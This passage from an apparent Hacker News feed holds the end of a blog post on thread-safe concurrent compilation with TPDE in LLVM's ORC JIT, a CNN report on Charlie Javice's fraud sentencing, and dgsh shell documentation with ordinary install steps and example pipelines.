   std::unique_ptr&amp;lt;tpde_llvm::LLVMCompiler&amp;gt; Compiler;
   std::vector&amp;lt;std::unique_ptr&amp;lt;std::vector&amp;lt;uint8_t&amp;gt;&amp;gt;&amp;gt; Buffers;
+  JITTargetMachineBuilder JTMB;
 };
 
 int main(int argc, char *argv[]) {
&lt;/code&gt;
    &lt;p&gt;Let’s test our fallback mechanism with the following IR file that uses an unsupported type:&lt;/p&gt;
    &lt;code&gt;@const_val = global bfloat 0xR4248

define i32 @main() {
entry:
  %c = load bfloat, ptr @const_val
  %i = fptosi bfloat %c to i32
  ret i32 %i
}
&lt;/code&gt;
    &lt;p&gt;Here’s what happens when we run it:&lt;/p&gt;
    &lt;code&gt;&amp;gt; ./tpde-orc 02-bfloat.ll
Loaded module: 02-bfloat.ll
[2025-09-25 12:54:03.076] [error] unsupported type: bfloat
[2025-09-25 12:54:03.076] [error] Failed to compile function main
Falling back to LLVM for module: 02-bfloat.ll
Executing main()
Program returned: 50
&lt;/code&gt;
    &lt;p&gt;In this implementation, we create a new &lt;code&gt;SimpleCompiler&lt;/code&gt; instance for each fallback case. While this adds some overhead, it’s acceptable since we’re already on the slow path. The key assumption is that most code in your workload will successfully compile with TPDE — if that’s not the case, then TPDE might not be the right choice in the first place. Interestingly, this approach has a valuable side-effect that becomes important in the next section: it’s inherently thread-safe!&lt;/p&gt;
    &lt;head rend="h3"&gt;Adding Concurrent Compilation Support&lt;/head&gt;
    &lt;p&gt;ORC JIT has built-in support for concurrent compilation. This is neat, but it requires attention when customizing the JIT. Our current setup uses a single &lt;code&gt;TPDECompiler&lt;/code&gt; instance, but TPDE’s &lt;code&gt;compile_to_elf()&lt;/code&gt; method isn’t thread-safe. Enabling concurrent compilation would cause multiple threads to call this method simultaneously, leading to failures.&lt;/p&gt;
    &lt;p&gt;How can we solve this? One option would be creating a new &lt;code&gt;tpde_llvm::LLVMCompiler&lt;/code&gt; instance for each compilation job, but that adds an overhead of &lt;code&gt;O(#jobs)&lt;/code&gt; — not ideal for our fast path. Essentially, we want to avoid calling into &lt;code&gt;compile_to_elf()&lt;/code&gt; while there is another call in-flight on the same thread. We can achieve this easily by making the &lt;code&gt;TPDECompiler&lt;/code&gt; instance thread-local, reducing the overhead to just &lt;code&gt;O(#threads)&lt;/code&gt;:&lt;/p&gt;
    &lt;code&gt;@@ -32,7 +32,6 @@ public:
   TPDECompiler(JITTargetMachineBuilder JTMB)
       : IRCompiler(irManglingOptionsFromTargetOptions(JTMB.getOptions())),
         JTMB(std::move(JTMB)) {
-    Compiler = tpde_llvm::LLVMCompiler::create(JTMB.getTargetTriple());
     assert(Compiler != nullptr &amp;amp;&amp;amp; "Unknown architecture");
   }
 
@@ -50,11 +49,14 @@ public:
   }
 
 private:
-  std::unique_ptr&amp;lt;tpde_llvm::LLVMCompiler&amp;gt; Compiler;
+  static thread_local std::unique_ptr&amp;lt;tpde_llvm::LLVMCompiler&amp;gt; Compiler;
   std::vector&amp;lt;std::unique_ptr&amp;lt;std::vector&amp;lt;uint8_t&amp;gt;&amp;gt;&amp;gt; Buffers;
   JITTargetMachineBuilder JTMB;
 };
 
+thread_local std::unique_ptr&amp;lt;tpde_llvm::LLVMCompiler&amp;gt; TPDECompiler::Compiler =
+    tpde_llvm::LLVMCompiler::create(Triple(LLVM_HOST_TRIPLE));
+
 int main(int argc, char *argv[]) {
   InitLLVM X(argc, argv);
   cl::ParseCommandLineOptions(argc, argv, "TPDE ORC JIT Compiler\n");
&lt;/code&gt;
    &lt;p&gt;We also need to guard access to our underlying buffers:&lt;/p&gt;
    &lt;code&gt;@@ -35,15 +35,19 @@ public:
   }
 
   Expected&amp;lt;std::unique_ptr&amp;lt;MemoryBuffer&amp;gt;&amp;gt; operator()(Module &amp;amp;M) override {
-    Buffers.push_back(std::make_unique&amp;lt;std::vector&amp;lt;uint8_t&amp;gt;&amp;gt;());
-    std::vector&amp;lt;uint8_t&amp;gt; *B = *Buffers.back().get();
+    std::vector&amp;lt;uint8_t&amp;gt; *B;
+    {
+      std::lock_guard&amp;lt;std::mutex&amp;gt; Lock(BuffersAccess);
+      Buffers.push_back(std::make_unique&amp;lt;std::vector&amp;lt;uint8_t&amp;gt;&amp;gt;());
+      B = Buffers.back().get();
+    }
 
     if (!Compiler-&amp;gt;compile_to_elf(M, *B)) {
       errs() &amp;lt;&amp;lt; "Falling back to LLVM for module: " &amp;lt;&amp;lt; M.getName() &amp;lt;&amp;lt; "\n";
@@ -50,6 +54,7 @@ public:
 private:
   static thread_local std::unique_ptr&amp;lt;tpde_llvm::LLVMCompiler&amp;gt; Compiler;
   std::vector&amp;lt;std::unique_ptr&amp;lt;std::vector&amp;lt;uint8_t&amp;gt;&amp;gt;&amp;gt; Buffers;
+  std::mutex BuffersAccess;
   JITTargetMachineBuilder JTMB;
 };

&lt;/code&gt;
    &lt;p&gt;With thread safety handled, we can now enable concurrent compilation:&lt;/p&gt;
    &lt;code&gt;@@ -27,6 +27,10 @@ static cl::opt&amp;lt;std::string&amp;gt; EntryPoint("entrypoint",
                                       cl::desc("Entry point function name"),
                                       cl::init("main"));

+static cl::opt&amp;lt;unsigned&amp;gt;
+    Threads("par", cl::desc("Compile csmith code on N threads concurrently"),
+            cl::init(0));
+
class TPDECompiler : public IRCompileLayer::IRCompiler {
public:
@@ -65,6 +65,8 @@ int main(int argc, char *argv[]) {
       -&amp;gt; Expected&amp;lt;std::unique_ptr&amp;lt;IRCompileLayer::IRCompiler&amp;gt;&amp;gt; {
     return std::make_unique&amp;lt;TPDECompiler&amp;gt;(JTMB);
   };
+  Builder.SupportConcurrentCompilation = true;
+  Builder.NumCompileThreads = Threads;
   std::unique_ptr&amp;lt;LLJIT&amp;gt; JIT = ExitOnErr(Builder.create());
 
   ThreadSafeModule TSM(std::move(Mod), std::move(Context));
&lt;/code&gt;
    &lt;head rend="h3"&gt;Exercising Concurrent Lookup&lt;/head&gt;
    &lt;p&gt;It needs a lot more support code to actually exercise concurrent compilation and do basic performance measurments. The complete sample project on GitHub has one possible implementation: after loading the input module, it creates 100 duplicates of it with different entry-point names and issues a single JIT lookup for all the entry-points at once. Here’s a simplified version of how this works:&lt;/p&gt;
    &lt;code&gt;SymbolMap SymMap;
SymbolLookupSet EntryPoints = addDuplicates(JIT, Mod);

outs() &amp;lt;&amp;lt; "Compiling " &amp;lt;&amp;lt; EntryPoints.size() &amp;lt;&amp;lt; " modules on " &amp;lt;&amp;lt; Threads
        &amp;lt;&amp;lt; " threads in parallel\n";

using namespace std::chrono;
auto ES = JIT-&amp;gt;getExecutionSession();
auto SO = makeJITDylibSearchOrder({JIT-&amp;gt;getMainJITDylib()});
auto Start = steady_clock::now();
{
  // Lookup all entry-points at once to execise concurrent compilation
  SymMap = ExitOnErr(ES.lookup(SO, EntryPoints));
}
auto End = steady_clock::now();
auto Elapsed = duration_cast&amp;lt;milliseconds&amp;gt;(End - Start);

outs() &amp;lt;&amp;lt; "Compile-time was: " &amp;lt;&amp;lt; Elapsed.count() &amp;lt;&amp;lt; " ms\n";
&lt;/code&gt;
    &lt;p&gt;Compile-times for our csmith example drop from ~2200ms to just ~740ms when utilizing 8 threads in parallel:&lt;/p&gt;
    &lt;code&gt;&amp;gt; ./tpde-orc --par 8 tpde-orc/03-csmith-tpde.ll
Load module: tpde-orc/03-csmith-tpde.ll
Compiling 100 modules on 8 threads in parallel
...
Compile-time was: 737 ms
&lt;/code&gt;
    &lt;head rend="h3"&gt;Et voilà!&lt;/head&gt;
    &lt;p&gt;Let’s wrap it up and appreciate the remarkable complexity that LLVM effortlessly handles in our little example. We parse a well-defined, human-readable representation of Turing-complete programs generated from various general-purpose languages like C++, Fortran, Rust, Swift, Julia, and Zig.&lt;/p&gt;
    &lt;p&gt;LLVM’s composable JIT engine seamlessly manages these parsed modules, automatically resolving symbols and dependencies. It compiles machine code in the native object format on-demand for multiple platforms and CPU architectures, while giving us complete control over the optimization pipeline, code generator (like our TPDE integration) and many more components. The engine then links everything into an executable form — all in-memory and without external tools or platform-specific dynamic library tricks! It’s really impressive that we can simply enable compilation on N threads in parallel and have it “just work” :-)&lt;/p&gt;
  &lt;/main&gt;
  &lt;comments/&gt;
&lt;/doc&gt;</content><link href="https://weliveindetail.github.io/blog/post/2025/09/30/tpde-in-llvm-orc.html"/><published>2025-09-30T10:51:45+00:00</published></entry><entry><id>https://news.ycombinator.com/item?id=45424223</id><title>Orbiting the Hénon Attractor</title><updated>2025-09-30T16:43:07.944115+00:00</updated><content>&lt;doc fingerprint="20ed59e32d044a20"&gt;
  &lt;main&gt;
    &lt;div&gt;
      &lt;head rend="h3"&gt;Purpose-built for displays of data&lt;/head&gt;
      &lt;p&gt;Observable is your go-to platform for exploring data and creating expressive data visualizations. Use reactive JavaScript notebooks for prototyping and a collaborative canvas for visual data exploration and dashboard creation.&lt;/p&gt;
    &lt;/div&gt;
  &lt;/main&gt;
  &lt;comments/&gt;
&lt;/doc&gt;</content><link href="https://observablehq.com/@yurivish/orbiting-the-henon-attractor"/><published>2025-09-30T11:31:04+00:00</published></entry><entry><id>https://news.ycombinator.com/item?id=45424412</id><title>Airgoods (YC S23) Is Hiring</title><updated>2025-09-30T16:43:07.672031+00:00</updated><content>&lt;doc fingerprint="e10fcdab2cdf53e4"&gt;
  &lt;main&gt;
    &lt;p&gt;You need to enable JavaScript to run this app.&lt;/p&gt;
  &lt;/main&gt;
  &lt;comments/&gt;
&lt;/doc&gt;</content><link href="https://airgoods.com/careers?utm_source=hacker_news"/><published>2025-09-30T12:00:39+00:00</published></entry><entry><id>https://news.ycombinator.com/item?id=45424827</id><title>Founder sentenced to seven years in prison for fraudulent sale to JPMorgan</title><updated>2025-09-30T16:43:07.431776+00:00</updated><content>&lt;doc fingerprint="3e7531193969103d"&gt;
  &lt;main&gt;
    &lt;p&gt;Charlie Javice, the founder of a startup company that promised to revolutionize the way college students apply for financial aid, was sentenced Monday to more than seven years in prison for cheating JPMorgan Chase out of $175 million by greatly exaggerating how many students it served.&lt;/p&gt;
    &lt;p&gt;Javice, 33, was convicted in March of duping the banking giant when it bought her company, called Frank, in the summer of 2021. She made false records that made it seem like Frank had over 4 million customers when it had fewer than 300,000.&lt;/p&gt;
    &lt;p&gt;Addressing the court before she was sentenced, Javice, who was in her mid-20s when she founded the company, said she was “haunted that my failure has transformed something meaningful into something infamous.”&lt;/p&gt;
    &lt;p&gt;Sometimes speaking through tears, she said she “made a choice that I will spend my entire life regretting.”&lt;/p&gt;
    &lt;p&gt;Judge Alvin K. Hellerstein largely dismissed arguments by Javice’s lawyer, Ronald Sullivan, that he should be lenient because the negotiations that led to Frank’s sale pitted “a 28-year-old versus 300 investment bankers from the largest bank in the world.”&lt;/p&gt;
    &lt;p&gt;Still, the judge criticized the bank, saying “they have a lot to blame themselves” for after failing to do adequate due diligence. He quickly added, though, that he was “punishing her conduct and not JPMorgan’s stupidity.”&lt;/p&gt;
    &lt;p&gt;Javice was among a number of young tech executives who vaulted to fame with supposedly disruptive or transformative companies, only to see them collapse amid questions about whether they had engaged in puffery and fraud while dealing with investors.&lt;/p&gt;
    &lt;p&gt;Her prosecution drew comparisons to the case against Elizabeth Holmes, the founder of a blood testing company, Theranos, that collapsed amid fraud allegations.&lt;/p&gt;
    &lt;p&gt;Javice, who lives in Florida, has been free on $2 million bail since her 2023 arrest. The judge said she could remain free while she appeals the verdict. She was convicted of conspiracy, bank fraud and wire fraud charges. Her lawyers had argued that JPMorgan (JPM) went after Javice because it had buyer’s remorse.&lt;/p&gt;
    &lt;p&gt;A graduate of the University of Pennsylvania’s Wharton School of Business, Javice founded Frank to launch software that promised to simplify the arduous process of filling out the Free Application for Federal Student Aid, a complex government form used by students to apply for aid for college or graduate school.&lt;/p&gt;
    &lt;p&gt;Frank’s backers included venture capitalist Michael Eisenberg. The company said its offering, akin to online tax preparation software, could help students maximize financial aid while making the application process less painful.&lt;/p&gt;
    &lt;p&gt;The company promoted itself as a way for financially needy students to obtain more aid faster, in return for a few hundred dollars in fees. Javice appeared regularly on cable news programs to boost Frank’s profile, also once appearing on Forbes’ “30 Under 30” list before JPMorgan bought the startup.&lt;/p&gt;
    &lt;p&gt;Sullivan told Hellerstein that his client was very different from Holmes because what she created actually worked, unlike Holmes, “who did not have a real company” and whose product “in fact endangered patients.” Sullivan said the bank rushed its negotiations because it feared another bank would acquire Frank first.&lt;/p&gt;
    &lt;p&gt;A prosecutor, Micah Fergenson, though, said JPMorgan “didn’t get a functioning business” in exchange for its investment. “They acquired a crime scene.”&lt;/p&gt;
    &lt;p&gt;Fergenson said Javice was driven by greed when she saw that she could pocket $29 million from the sale of her company.&lt;/p&gt;
    &lt;p&gt;“Ms. Javice had it dangling in front of her and she lied to get it,” he said.&lt;/p&gt;
    &lt;p&gt;And in seeking a long prison sentence for Javice, prosecutors cited a 2022 text she had sent to a colleague in which she called it “ridiculous” that Holmes got over 11 years in prison in the Theranos case.&lt;/p&gt;
    &lt;p&gt;Prosecutors noted “an alarming trend of founders and executives of small startup companies engaging in fraud, including making misrepresentations about their companies’ core products or services, in order to make their companies attractive targets for investors and/or buyers.”&lt;/p&gt;
  &lt;/main&gt;
  &lt;comments/&gt;
&lt;/doc&gt;</content><link href="https://www.cnn.com/2025/09/30/business/charlie-javice-frank-sentenced-jpmorgan-intl"/><published>2025-09-30T12:53:49+00:00</published></entry><entry><id>https://news.ycombinator.com/item?id=45425298</id><title>dgsh – Directed Graph Shell</title><updated>2025-09-30T16:43:05.821467+00:00</updated><content>&lt;doc fingerprint="577bba9067313cc8"&gt;
  &lt;main&gt;&lt;p&gt;The directed graph shell, dgsh (pronounced /dÃ¦É¡Ê/ — dagsh), provides an expressive way to construct sophisticated and efficient big data set and stream processing pipelines using existing Unix tools as well as custom-built components. It is a Unix-style shell (based on bash) allowing the specification of pipelines with non-linear non-uniform operations. These form a directed acyclic process graph, which is typically executed by multiple processor cores, thus increasing the operation's processing throughput.&lt;/p&gt;&lt;p&gt;If you want to get a feeling on how dgsh works in practice, skip right down to the examples section.&lt;/p&gt;&lt;p&gt; For a more formal introduction to dgsh or to cite it in your work, see:&lt;lb/&gt; Diomidis Spinellis and Marios Fragkoulis. Extending Unix Pipelines to DAGs. IEEE Transactions on Computers, 2017. doi: 10.1109/TC.2017.2695447 &lt;/p&gt;&lt;p&gt;Dgsh provides two new ways for expressing inter-process communication.&lt;/p&gt;&lt;code&gt;comm&lt;/code&gt; command supplied with dgsh
expects two input channels and produces on its output three
output channels: the lines appearing only in first (sorted) channel,
the lines appearing only in the second channel,
and the lines appearing in both.
Connecting the output of the &lt;code&gt;comm&lt;/code&gt; command to the
&lt;code&gt;cat&lt;/code&gt; command supplied with dgsh
will make the three outputs appear in sequence,
while connecting it to the
&lt;code&gt;paste&lt;/code&gt; command supplied with dgsh
will make the output appear in its customary format.
&lt;code&gt;md5sum&lt;/code&gt; and &lt;code&gt;wc -c&lt;/code&gt;
receives two inputs and produces two outputs:
the MD5 hash of its input and the input's size.
Data to multipipe blocks are typically provided with a
dgsh-aware version of &lt;code&gt;tee&lt;/code&gt; and collected by
dgsh-aware versions of programs such as
&lt;code&gt;cat&lt;/code&gt; and &lt;code&gt;paste&lt;/code&gt;.
&lt;code&gt;dgsh-writeval&lt;/code&gt;, and
a reader program, &lt;code&gt;dgsh-readval&lt;/code&gt;.
The behavior of a stored value's IO can be modified by adding flags to
&lt;code&gt;dgsh-writeval&lt;/code&gt; and &lt;code&gt;dgsh-readval&lt;/code&gt;.
&lt;p&gt;A dgsh script follows the syntax of a bash(1) shell script with the addition of multipipe blocks. A multipipe block contains one or more dgsh simple commands, other multipipe blocks, or pipelines of the previous two types of commands. The commands in a multipipe block are executed asynchronously (in parallel, in the background). Data may be redirected or piped into and out of a multipipe block. With multipipe blocks dgsh scripts form directed acyclic process graphs. It follows from the above description that multipipe blocks can be recursively composed.&lt;/p&gt;&lt;p&gt;As a simple example consider running the following command directly within dgsh&lt;/p&gt;&lt;quote&gt;{{ echo hello &amp;amp; echo world &amp;amp; }} | paste&lt;/quote&gt;&lt;p&gt; or by invoking &lt;code&gt;dgsh&lt;/code&gt; with the command as an argument.
&lt;/p&gt;&lt;quote&gt;dgsh -c '{{ echo hello &amp;amp; echo world &amp;amp; }} | paste'&lt;/quote&gt;&lt;p&gt; The command will run paste with input from the two echo processes to output &lt;code&gt;hello world&lt;/code&gt;.
This is equivalent to running the following bash command,
but with the flow of data appearing in the natural left-to-right order.
&lt;/p&gt;&lt;quote&gt;paste &amp;lt;(echo hello) &amp;lt;(echo world)&lt;/quote&gt;&lt;p&gt; In the following larger example, which compares the performance of different compression utilities, the script's standard input is distributed to three compression utilities (xz, bzip2, and gzip), to assess their performance, and also to file and wc to report the input data's type and size. The printf commands label the data of each processing type. All eight commands pass their output to the &lt;code&gt;cat&lt;/code&gt; command, which gathers their outputs
in order.
&lt;/p&gt;&lt;quote&gt;tee | {{ printf 'File type:\t' file - printf 'Original size:\t' wc -c printf 'xz:\t\t' xz -c | wc -c printf 'bzip2:\t\t' bzip2 -c | wc -c printf 'gzip:\t\t' gzip -c | wc -c }} | cat&lt;/quote&gt;&lt;p&gt; Formally, dgsh extends the syntax of the (modified) Unix Bourne-shell when &lt;code&gt;bash&lt;/code&gt; provided with the &lt;code&gt;--dgsh&lt;/code&gt; argument
as follows.
&lt;/p&gt;&lt;quote&gt;&amp;lt;dgsh_block&amp;gt; ::= '{{' &amp;lt;dgsh_list&amp;gt; '}}' &amp;lt;dgsh_list&amp;gt; ::= &amp;lt;dgsh_list_item&amp;gt; '&amp;amp;' &amp;lt;dgsh_list_item&amp;gt; &amp;lt;dgsh_list&amp;gt; &amp;lt;dgsh_list_item&amp;gt; ::= &amp;lt;simple_command&amp;gt; &amp;lt;dgsh_block&amp;gt; &amp;lt;dgsh_list_item&amp;gt; '|' &amp;lt;dgsh_list_item&amp;gt;&lt;/quote&gt;&lt;p&gt;A number of Unix tools have been adapted to support multiple inputs and outputs to match their natural capabilities. This echoes a similar adaptation that was performed in the early 1970s when Unix and the shell got pipes and the pipeline syntax. Many programs that worked with files were adjusted to work as filters. The number of input and output channels of dgsh-compatible commands are as follows, based on the supplied command-line arguments.&lt;/p&gt;&lt;table&gt;&lt;row span="4"&gt;&lt;cell role="head"&gt;Tool&lt;/cell&gt;&lt;cell role="head"&gt;Inputs&lt;/cell&gt;&lt;cell role="head"&gt;Outputs&lt;/cell&gt;&lt;cell role="head"&gt;Notes&lt;/cell&gt;&lt;/row&gt;&lt;row span="4"&gt;&lt;cell&gt;cat (dgsh-tee)&lt;/cell&gt;&lt;cell&gt;0—N&lt;/cell&gt;&lt;cell&gt;0—M&lt;/cell&gt;&lt;cell&gt;No options are supported&lt;/cell&gt;&lt;/row&gt;&lt;row span="4"&gt;&lt;cell&gt;cmp&lt;/cell&gt;&lt;cell&gt;0—2&lt;/cell&gt;&lt;cell&gt;0—1&lt;/cell&gt;&lt;/row&gt;&lt;row span="4"&gt;&lt;cell&gt;comm&lt;/cell&gt;&lt;cell&gt;0—2&lt;/cell&gt;&lt;cell&gt;0—3&lt;/cell&gt;&lt;cell&gt;Output streams in order: lines only in first file, lines only in second one, and lines in both files&lt;/cell&gt;&lt;/row&gt;&lt;row span="4"&gt;&lt;cell&gt;cut&lt;/cell&gt;&lt;cell&gt;0—1&lt;/cell&gt;&lt;cell&gt;1—N&lt;/cell&gt;&lt;cell&gt;With &lt;code&gt;--multistream&lt;/code&gt; output each range into a different stream&lt;/cell&gt;&lt;/row&gt;&lt;row span="4"&gt;&lt;cell&gt;diff&lt;/cell&gt;&lt;cell&gt;0—N&lt;/cell&gt;&lt;cell&gt;1&lt;/cell&gt;&lt;cell&gt;Typically two inputs. Compare an arbitrary number of input streams with the &lt;code&gt;--from-file&lt;/code&gt; or &lt;code&gt;--to-file&lt;/code&gt; options&lt;/cell&gt;&lt;/row&gt;&lt;row span="4"&gt;&lt;cell&gt;diff3&lt;/cell&gt;&lt;cell&gt;0—3&lt;/cell&gt;&lt;cell&gt;1&lt;/cell&gt;&lt;/row&gt;&lt;row span="4"&gt;&lt;cell&gt;grep&lt;/cell&gt;&lt;cell&gt;0—2&lt;/cell&gt;&lt;cell&gt;0—4&lt;/cell&gt;&lt;cell&gt;Available output streams (via arguments): matching files, non-matching files, matching lines, and non-matching lines&lt;/cell&gt;&lt;/row&gt;&lt;row span="4"&gt;&lt;cell&gt;join&lt;/cell&gt;&lt;cell&gt;0—2&lt;/cell&gt;&lt;cell&gt;1&lt;/cell&gt;&lt;/row&gt;&lt;row span="4"&gt;&lt;cell&gt;paste&lt;/cell&gt;&lt;cell&gt;0—N&lt;/cell&gt;&lt;cell&gt;1&lt;/cell&gt;&lt;cell&gt;Paste N input streams&lt;/cell&gt;&lt;/row&gt;&lt;row span="4"&gt;&lt;cell&gt;perm&lt;/cell&gt;&lt;cell&gt;1—N&lt;/cell&gt;&lt;cell&gt;1—N&lt;/cell&gt;&lt;cell&gt;Rearrange the order of N input streams&lt;/cell&gt;&lt;/row&gt;&lt;row span="4"&gt;&lt;cell&gt;sort&lt;/cell&gt;&lt;cell&gt;0—N&lt;/cell&gt;&lt;cell&gt;0—1&lt;/cell&gt;&lt;cell&gt;With the &lt;code&gt;-m&lt;/code&gt; option, merge sort N input streams&lt;/cell&gt;&lt;/row&gt;&lt;row span="4"&gt;&lt;cell&gt;tee (dgsh-tee)&lt;/cell&gt;&lt;cell&gt;0—N&lt;/cell&gt;&lt;cell&gt;0—M&lt;/cell&gt;&lt;cell&gt;Only the &lt;code&gt;-a&lt;/code&gt; option is supported&lt;/cell&gt;&lt;/row&gt;&lt;row span="4"&gt;&lt;cell&gt;dgsh-readval&lt;/cell&gt;&lt;cell&gt;0&lt;/cell&gt;&lt;cell&gt;1&lt;/cell&gt;&lt;cell&gt;Read a value from a socket&lt;/cell&gt;&lt;/row&gt;&lt;row span="4"&gt;&lt;cell&gt;dgsh-wrap&lt;/cell&gt;&lt;cell&gt;0—N&lt;/cell&gt;&lt;cell&gt;0—1&lt;/cell&gt;&lt;cell&gt;Wrap non-dgsh commands and negotiate on their behalf&lt;/cell&gt;&lt;/row&gt;&lt;row&gt;&lt;cell&gt;dgsh-writeval&lt;/cell&gt;&lt;cell&gt;1&lt;/cell&gt;&lt;cell&gt;0&lt;/cell&gt;&lt;cell&gt;Write a value to a socket&lt;/cell&gt;&lt;/row&gt;&lt;/table&gt;&lt;p&gt; In addition, POSIX user commands that receive no input or only generate no output, when executed in a dgsh context are wrapped to specify the corresponding input or output capability. For example, an &lt;code&gt;echo&lt;/code&gt; command in a multipipe block
will appear to receive no input, but will provide one output stream.
By default &lt;code&gt;dgsh&lt;/code&gt; automatically wraps all other
commands as filters.
&lt;/p&gt;&lt;p&gt;Finally, note that any dgsh script will accept and generate the number of inputs and outputs associated with the commands or multipipe blocks at its two endpoints.&lt;/p&gt;&lt;p&gt;The dgsh suite has been tested under Debian and Ubuntu Linux, FreeBSD, and Mac OS X. A Cygwin port is underway.&lt;/p&gt;&lt;p&gt;An installation of GraphViz will allow you to visualize the dgsh graphs that you specify in your programs.&lt;/p&gt;&lt;p&gt;To compile and run dgsh you will need to have the following commands installed on your system:&lt;/p&gt;&lt;quote&gt;make automake gcc libtool pkg-config texinfo help2man autopoint bison check gperf git xz-utils gettextTo test dgsh you will need to have the following commands installed in your system:&lt;/quote&gt;&lt;quote&gt;wbritish wamerican libfftw3-dev csh curl bzip2&lt;/quote&gt;&lt;p&gt;Go through the following steps.&lt;/p&gt;&lt;quote&gt;git clone --recursive https://github.com/dspinellis/dgsh.git&lt;/quote&gt;&lt;quote&gt;make config&lt;/quote&gt;&lt;quote&gt;make&lt;/quote&gt;&lt;quote&gt;sudo make install&lt;/quote&gt;&lt;p&gt; By default, the program and its documentation are installed under &lt;code&gt;/usr/local&lt;/code&gt;.
You can modify this by setting the &lt;code&gt;PREFIX&lt;/code&gt; variable
in the `config` step, for example:
&lt;/p&gt;&lt;quote&gt;make PREFIX=$HOME config make make install&lt;/quote&gt;&lt;p&gt;Issue the following command.&lt;/p&gt;&lt;quote&gt;make test&lt;/quote&gt;&lt;p&gt;To compile and run dgsh you will need to have the following packages installed in your system:&lt;/p&gt;&lt;quote&gt;devel/automake devel/bison devel/check devel/git devel/gmake devel/gperf misc/help2man print/texinfo shells/bashTo test dgsh you will need to have the following ports installed on your system:&lt;/quote&gt;&lt;quote&gt;archivers/bzip2 ftp/curl&lt;/quote&gt;&lt;p&gt;Go through the following steps.&lt;/p&gt;&lt;quote&gt;git clone --recursive https://github.com/dspinellis/dgsh.git&lt;/quote&gt;&lt;quote&gt;gmake config&lt;/quote&gt;&lt;quote&gt;gmake&lt;/quote&gt;&lt;quote&gt;sudo gmake install&lt;/quote&gt;&lt;p&gt; By default, the program and its documentation are installed under &lt;code&gt;/usr/local&lt;/code&gt;.
You can modify this by setting the &lt;code&gt;PREFIX&lt;/code&gt; variable
in the `config` step, for example:
&lt;/p&gt;&lt;quote&gt;gmake PREFIX=$HOME config gmake gmake install&lt;/quote&gt;&lt;p&gt;Issue the following command.&lt;/p&gt;&lt;quote&gt;gmake test&lt;/quote&gt;&lt;p&gt;These are the manual pages for dgsh, the associated helper programs and the API in formats suitable for browsing and printing. The commands are listed in the order of usefulness in everyday scenarios.&lt;/p&gt;&lt;p&gt;Report file type, length, and compression performance for data received from the standard input. The data never touches the disk. Demonstrates the use of an output multipipe to source many commands from one followed by an input multipipe to sink to one command the output of many and the use of dgsh-tee that is used both to propagate the same input to many commands and collect output from many commands orderly in a way that is transparent to users.&lt;/p&gt;&lt;quote&gt;#!/usr/bin/env dgsh tee | {{ printf 'File type:\t' file - printf 'Original size:\t' wc -c printf 'xz:\t\t' xz -c | wc -c printf 'bzip2:\t\t' bzip2 -c | wc -c printf 'gzip:\t\t' gzip -c | wc -c }} | cat&lt;/quote&gt;&lt;p&gt;Process the Git history, and list the authors and days of the week ordered by the number of their commits. Demonstrates streams and piping through a function.&lt;/p&gt;&lt;quote&gt;#!/usr/bin/env dgsh forder() { sort | uniq -c | sort -rn } git log --format="%an:%ad" --date=default "$@" | tee | {{ echo "Authors ordered by number of commits" # Order by frequency awk -F: '{print $1}' | forder echo "Days ordered by number of commits" # Order by frequency awk -F: '{print substr($2, 1, 3)}' | forder }} | cat&lt;/quote&gt;&lt;p&gt;Process a directory containing C source code, and produce a summary of various metrics. Demonstrates nesting, commands without input.&lt;/p&gt;&lt;quote&gt;#!/usr/bin/env dgsh {{ # C and header code find "$@" \( -name \*.c -or -name \*.h \) -type f -print0 | tee | {{ # Average file name length # Convert to newline separation for counting echo -n 'FNAMELEN: ' tr \\0 \\n | # Remove path sed 's|^.*/||' | # Maintain average awk '{s += length($1); n++} END { if (n&amp;gt;0) print s / n; else print 0; }' xargs -0 /bin/cat | tee | {{ # Remove strings and comments sed 's/#/@/g;s/\\[\\"'\'']/@/g;s/"[^"]*"/""/g;'"s/'[^']*'/''/g" | cpp -P | tee | {{ # Structure definitions echo -n 'NSTRUCT: ' egrep -c 'struct[ ]*{|struct[ ]*[a-zA-Z_][a-zA-Z0-9_]*[ ]*{' #}} (match preceding openings) # Type definitions echo -n 'NTYPEDEF: ' grep -cw typedef # Use of void echo -n 'NVOID: ' grep -cw void # Use of gets echo -n 'NGETS: ' grep -cw gets # Average identifier length echo -n 'IDLEN: ' tr -cs 'A-Za-z0-9_' '\n' | sort -u | awk '/^[A-Za-z]/ { len += length($1); n++ } END { if (n&amp;gt;0) print len / n; else print 0; }' }} # Lines and characters echo -n 'CHLINESCHAR: ' wc -lc | awk '{OFS=":"; print $1, $2}' # Non-comment characters (rounded thousands) # -traditional avoids expansion of tabs # We round it to avoid failing due to minor # differences between preprocessors in regression # testing echo -n 'NCCHAR: ' sed 's/#/@/g' | cpp -traditional -P | wc -c | awk '{OFMT = "%.0f"; print $1/1000}' # Number of comments echo -n 'NCOMMENT: ' egrep -c '/\*|//' # Occurences of the word Copyright echo -n 'NCOPYRIGHT: ' grep -ci copyright }} }} # C files find "$@" -name \*.c -type f -print0 | tee | {{ # Convert to newline separation for counting tr \\0 \\n | tee | {{ # Number of C files echo -n 'NCFILE: ' wc -l # Number of directories containing C files echo -n 'NCDIR: ' sed 's,/[^/]*$,,;s,^.*/,,' | sort -u | wc -l }} # C code xargs -0 /bin/cat | tee | {{ # Lines and characters echo -n 'CLINESCHAR: ' wc -lc | awk '{OFS=":"; print $1, $2}' # C code without comments and strings sed 's/#/@/g;s/\\[\\"'\'']/@/g;s/"[^"]*"/""/g;'"s/'[^']*'/''/g" | cpp -P | tee | {{ # Number of functions echo -n 'NFUNCTION: ' grep -c '^{' # Number of gotos echo -n 'NGOTO: ' grep -cw goto # Occurrences of the register keyword echo -n 'NREGISTER: ' grep -cw register # Number of macro definitions echo -n 'NMACRO: ' grep -c '@[ ]*define[ ][ ]*[a-zA-Z_][a-zA-Z0-9_]*(' # Number of include directives echo -n 'NINCLUDE: ' grep -c '@[ ]*include' # Number of constants echo -n 'NCONST: ' grep -ohw '[0-9][x0-9][0-9a-f]*' | wc -l }} }} }} # Header files echo -n 'NHFILE: ' find "$@" -name \*.h -type f | wc -l }} | # Gather and print the results cat&lt;/quote&gt;&lt;p&gt;List the names of duplicate files in the specified directory. Demonstrates the combination of streams with a relational join.&lt;/p&gt;&lt;quote&gt;#!/usr/bin/env dgsh # Create list of files find "$@" -type f | # Produce lines of the form # MD5(filename)= 811bfd4b5974f39e986ddc037e1899e7 xargs openssl md5 | # Convert each line into a "filename md5sum" pair sed 's/^MD5(//;s/)= / /' | # Sort by MD5 sum sort -k2 | tee | {{ # Print an MD5 sum for each file that appears more than once awk '{print $2}' | uniq -d # Promote the stream to gather it cat }} | # Join the repeated 